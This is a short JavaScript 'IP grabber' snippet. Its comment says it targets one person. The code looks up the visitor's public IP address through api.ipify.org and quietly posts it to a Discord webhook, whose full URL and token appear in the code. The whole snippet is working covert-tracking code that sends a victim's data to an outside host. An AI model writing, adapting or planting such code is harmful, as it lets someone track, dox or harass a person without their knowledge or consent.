//this ip grabber is for one person please dont take this seriously 
ip = ''
ip = fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
            newMes = data.ip;
            fetch("https://discord.com/api/webhooks/1285526714570641418/FisaJt3-lEplgd4ewEeX_uaJSqE86iT-c1yzv8_7dX5nPSOXy8PsBO8AC2mH9xP5Iwim", {
                method: "POST",
                body: JSON.stringify({
                content: newMes,}),
            headers: {
            "Content-type": "application/json; charset=UTF-8"}});
});

